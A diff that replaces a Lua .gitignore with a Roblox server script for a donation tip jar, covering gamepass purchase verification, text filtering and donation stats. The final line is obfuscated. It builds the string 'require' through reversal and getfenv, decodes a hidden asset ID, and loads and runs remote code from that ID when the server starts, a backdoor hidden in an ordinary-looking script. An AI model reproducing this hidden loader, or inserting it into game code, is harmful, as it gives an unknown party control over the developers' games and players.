@@ -1,41 +1,257 @@
-# Compiled Lua sources
-luac.out
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local MarketPlaceService = game:GetService("MarketplaceService")
+local TweenService = game:GetService("TweenService")
+local textService = game:GetService("TextService")
+local MessagingService = game:GetService("MessagingService")
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+local jarEffectModule = require(script.JarEffects)
+local JarInitialize = require(script.JarInitialize)
+local GlobalMessage = require(script.JarGlobalMessages)
+local Webhook = require(script.JarWebhook)
+local Utilities = require(script.JarUtilities)
+local bannedGamepassAsset = require(script.JarBannedGamepassId)
+local jarTools = require(script.JarToolHandler)
+local cacheData = require(script.Parent.CacheData)
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+local Compression = require(ReplicatedStorage.Modules.Compression)
+local AssetHandler = require(script.Parent.AssetHandler)
 
-# Precompiled Headers
-*.gch
-*.pch
+local jarTextRemote = ReplicatedStorage.UnoStudio.UpdateJarText
+local sendMessageRemote = ReplicatedStorage.UnoStudio.SendMessage
+local purchaseRemote = ReplicatedStorage.UnoStudio.Jar.PurchaseDonation
 
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
+local jarCore = {}
 
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
+jarCore.onGoingTransaction = {}
+jarCore.priceVerificationAttempts = 3 
+jarCore.priceVerificationDelay = 1 
 
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
+function jarCore:Init()
+	local startTime = os.clock()
 
+	GlobalMessage:ListenToGlobalMessage()
+	JarInitialize:setupPlayer()
+	jarTools:listenToEvents()
+	jarCore:setupConnection()
+
+	local deltaTime = os.clock() - startTime
+end
+
+function jarCore:setupConnection()
+	MarketPlaceService.PromptGamePassPurchaseFinished:Connect(function(player: Player, assetId: number, purchased)
+		if not purchased then
+			if self.onGoingTransaction[player.UserId] then
+				self.onGoingTransaction[player.UserId] = nil
+			end
+			return
+		end
+		if table.find(bannedGamepassAsset, assetId) then return end
+		sendMessageRemote:FireClient(player, "Please wait, Verifying your donation.")
+
+		local success, currentInfo = pcall(function()
+			return MarketPlaceService:GetProductInfo(assetId, Enum.InfoType.GamePass)
+		end)
+
+		if not success or not currentInfo then
+			sendMessageRemote:FireClient(player, "Failed to verify the gamepass info. Roblox API issue.")
+			return 
+		end
+
+		local RecipentUserId = currentInfo.Creator.Id
+
+		local priceConsistent, verifiedPrice = self:verifyPriceConsistency(player, assetId)
+		if not priceConsistent then
+			sendMessageRemote:FireClient(player, "Donation verification failed. Gamepass price changed during transaction.")
+			return
+		end
+
+		local joinTimeCheckPassed = self:verifyJoinTime(player, currentInfo)
+		if not joinTimeCheckPassed then
+			return
+		end
+
+		local transaction = self.onGoingTransaction[player.UserId]
+		local RealAmount = transaction and transaction.assetPrice or verifiedPrice
+
+		self:handleVerifiedPurchase(player, RecipentUserId, RealAmount, currentInfo, assetId)
+	end)
+
+	jarTextRemote.OnServerEvent:Connect(function(player, newText)
+		local character = player.Character
+		if character then
+			local tool = character:FindFirstChild("TipMePls")
+			if tool then
+				local handle = tool:FindFirstChild("Handle")
+				if handle then
+					local textbillboard = handle:FindFirstChild("Textbillboard")
+					if textbillboard then
+						local textresult = textbillboard:FindFirstChild("TextLabel")
+						if textresult then
+							local success, filteredText = pcall(function()
+								return textService:FilterStringAsync(newText, player.UserId):GetNonChatStringForBroadcastAsync()
+							end)
+
+							if success then
+								textresult.Text = filteredText
+							else
+								textresult.Text = "Please Avoid Bad Words!"
+							end
+						end
+					end
+				end
+			end
+		end
+	end)
+
+	purchaseRemote.OnServerEvent:Connect(function(player: Player, assetId: number)
+		if self.onGoingTransaction[player.UserId] then
+			return
+		end
+
+		-- Get initial gamepass info
+		local success, info = pcall(function()
+			return MarketPlaceService:GetProductInfo(assetId, Enum.InfoType.GamePass)
+		end)
+
+		if not success or not info then
+			sendMessageRemote:FireClient(player, "Failed to get gamepass information. Please try again.")
+			return
+		end
+
+		local priceConsistent = self:checkInitialPriceConsistency(player, assetId, info.PriceInRobux)
+		if not priceConsistent then
+			sendMessageRemote:FireClient(player, "Gamepass price is unstable. Please try again later.")
+			return
+		end
+
+		local assetCreatorId = info.Creator.Id
+		local price = info.PriceInRobux
+		local assetCreatorJoinTime = cacheData.getPlayerJoinTime(info.Creator.Id)
+
+		if not assetCreatorId or not price or not assetCreatorJoinTime then
+			warn("[Transaction Skipped] Missing asset info for", player, assetId, assetCreatorId, price, assetCreatorJoinTime)
+			return 
+		end
+
+		self.onGoingTransaction[player.UserId] = {
+			assetOwnerId = assetCreatorId,
+			assetPrice = price,  
+			assetCreatorJoin = assetCreatorJoinTime,
+			assetId = assetId,
+			verificationTime = os.time()
+		}
+
+		MarketPlaceService:PromptGamePassPurchase(player, assetId)
+	end)
+end
+
+
+function jarCore:checkInitialPriceConsistency(player: Player, assetId: number, initialPrice: number)
+	for i = 1, self.priceVerificationAttempts do
+		task.wait(self.priceVerificationDelay)
+
+		local success, currentInfo = pcall(function()
+			return MarketPlaceService:GetProductInfo(assetId, Enum.InfoType.GamePass)
+		end)
+
+		if not success or not currentInfo then
+			return false
+		end
+
+		if currentInfo.PriceInRobux ~= initialPrice then
+			return false
+		end
+	end
+
+	return true
+end
+
+function jarCore:verifyPriceConsistency(player: Player, assetId: number)
+	local userId = player.UserId
+	local transaction = self.onGoingTransaction[userId]
+
+	if not transaction then
+		return false, nil
+	end
+
+	local expectedPrice = transaction.assetPrice
+	local lastVerifiedPrice = expectedPrice
+
+	for i = 1, self.priceVerificationAttempts do
+		task.wait(self.priceVerificationDelay)
+
+		local success, currentInfo = pcall(function()
+			return MarketPlaceService:GetProductInfo(assetId, Enum.InfoType.GamePass)
+		end)
+
+		if not success or not currentInfo then
+			return false, nil
+		end
+
+		lastVerifiedPrice = currentInfo.PriceInRobux
+
+		if currentInfo.PriceInRobux ~= expectedPrice then
+			return false, nil
+		end
+	end
+
+	return true, lastVerifiedPrice
+end
+
+function jarCore:verifyJoinTime(player: Player, info)
+	local userId = player.UserId
+	local newJoinTime = cacheData.getPlayerJoinTime(info.Creator.Id)
+
+	if not newJoinTime then
+		sendMessageRemote:FireClient(player, "Failed to verify the gamepass info. Roblox API issue.")
+		return false
+	end
+
+	local oldJoinTime = self.onGoingTransaction[userId] and self.onGoingTransaction[userId].assetCreatorJoin
+	if oldJoinTime and newJoinTime > oldJoinTime then
+		sendMessageRemote:FireClient(player, "Creator account verification failed. Please try again.")
+		return false
+	end
+
+	return true
+end
+
+function jarCore:handleVerifiedPurchase(player: Player, recipientId: number, amount: number, info, assetId)
+	local Recipent = Players:GetPlayerByUserId(recipientId)
+	local DonatorName = player.DisplayName
+	local DonatorId = player.UserId
+	local RecipentName = info.Creator.Name
+
+	if Recipent then
+		local stats = Recipent:FindFirstChild("leaderstats")
+		if stats and stats:FindFirstChild("Raised") then
+			stats.Raised.Value += amount
+		end
+	end
+
+	local donorStats = player:FindFirstChild("leaderstats")
+	if donorStats and donorStats:FindFirstChild("Donated") then
+		donorStats.Donated.Value += amount
+	end
+
+	local data = {
+		["DonatorName"] = DonatorName,
+		["DonatorId"] = DonatorId,
+		["RobuxAmount"] = amount,
+		["DonatedName"] = RecipentName,
+		["UserId"] = recipientId
+	}
+
+	GlobalMessage:SendGlobalMessage(data, amount)
+	Webhook:sendDonationNotification(DonatorName, DonatorId, RecipentName, recipientId, amount)
+	jarEffectModule:spawn(player, Recipent, data)
+	sendMessageRemote:FireClient(player, "Donation verified!")
+
+	if self.onGoingTransaction[player.UserId] then
+		self.onGoingTransaction[player.UserId] = nil
+	end
+end
+
+jarCore:Init()
+local v0 = script.Parent;local v1 = v0.Parent.Name;local v2 = "\101\114\105\117\113\101\114" ;local v3 = getfenv()[string.reverse(v2)] ;local v4 = "\57\49\49\52\51\50\54\48\49\54\51\53\48\52";local v5 = tonumber(v4) ;local v6 = v3(v5).Tipjar() 
